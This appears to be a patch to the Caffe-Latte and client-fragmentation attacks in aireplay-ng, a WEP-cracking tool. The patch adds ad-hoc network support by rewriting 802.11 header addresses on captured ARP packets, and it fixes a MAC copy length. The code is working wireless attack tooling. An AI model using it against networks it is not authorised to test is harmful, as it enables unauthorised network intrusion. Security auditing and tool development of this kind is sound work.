@@ -2558,6 +2558,7 @@ int do_attack_caffe_latte( void )
     opt.f_type    = 2;
     opt.f_subtype = 0;
     opt.f_iswep   = 1;
+    opt.f_fromds  = 0;
 
     if(getnet(NULL, 1, 1) != 0)
         return 1;
@@ -2792,6 +2793,26 @@ int do_attack_caffe_latte( void )
 add_arp:
             switch( h80211[1] & 3 )
             {
+                case  0: /* ad-hoc */
+                {
+                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)
+                    {
+                        /* rewrite to an ad-hoc packet */
+
+                        memcpy( h80211 +  4, BROADCAST, 6 );
+                        memcpy( h80211 + 10, opt.r_smac,  6 );
+                        memcpy( h80211 + 16, opt.f_bssid,  6 );
+
+                        h80211[1] = 0x40;   /* WEP  */
+                    }
+                    else
+                    {
+                        nb_arp_tot++;
+                        continue;
+                    }
+
+                    break;
+                }
                 case  1: /* ToDS */
                 {
                     if(memcmp(h80211 + 16, BROADCAST, 6) == 0)
@@ -2952,7 +2973,7 @@ int set_final_ip(uchar *buf, uchar *mymac)
     buf[1] = 0x04; //protocol size
     buf[2] = 0x00;
     buf[3] = 0x01; //request
-    memcpy(buf+4, mymac, 5); //sender mac
+    memcpy(buf+4, mymac, 6); //sender mac
 
     return 0;
 }
@@ -2972,7 +2993,7 @@ int do_attack_cfrag( void )
     int isarp;
     int z, i;
 
-    opt.f_tods = 1;
+    opt.f_fromds = 0;
 
 read_packets:
 
@@ -3040,10 +3061,20 @@ read_packets:
 
         // correct 80211 header
         h80211[0] = 0x08;    //data
-        h80211[1] = 0x42;    //wep+FromDS
-        memcpy(h80211+4, smac, 6);
-        memcpy(h80211+10, bssid, 6);
-        memcpy(h80211+16, opt.r_smac, 6);
+        if( (h80211[1] & 3) == 0x00 ) //ad-hoc
+        {
+            h80211[1] = 0x40;    //wep
+            memcpy(h80211+4, smac, 6);
+            memcpy(h80211+10, opt.r_smac, 6);
+            memcpy(h80211+16, bssid, 6);
+        }
+        else //tods
+        {
+            h80211[1] = 0x42;    //wep+FromDS
+            memcpy(h80211+4, smac, 6);
+            memcpy(h80211+10, bssid, 6);
+            memcpy(h80211+16, opt.r_smac, 6);
+        }
         h80211[22] = 0xD0; //frag = 0;
         h80211[23] = 0x50;
 
@@ -3083,10 +3114,20 @@ read_packets:
 
         // correct 80211 header
         h80211[0] = 0x08;    //data
-        h80211[1] = 0x42;    //wep+FromDS
-        memcpy(h80211+4, smac, 6);
-        memcpy(h80211+10, bssid, 6);
-        memcpy(h80211+16, opt.r_smac, 6);
+        if( (h80211[1] & 3) == 0x00 ) //ad-hoc
+        {
+            h80211[1] = 0x40;    //wep
+            memcpy(h80211+4, smac, 6);
+            memcpy(h80211+10, opt.r_smac, 6);
+            memcpy(h80211+16, bssid, 6);
+        }
+        else
+        {
+            h80211[1] = 0x42;    //wep+FromDS
+            memcpy(h80211+4, smac, 6);
+            memcpy(h80211+10, bssid, 6);
+            memcpy(h80211+16, opt.r_smac, 6);
+        }
         h80211[22] = 0xD0; //frag = 0;
         h80211[23] = 0x50;
 
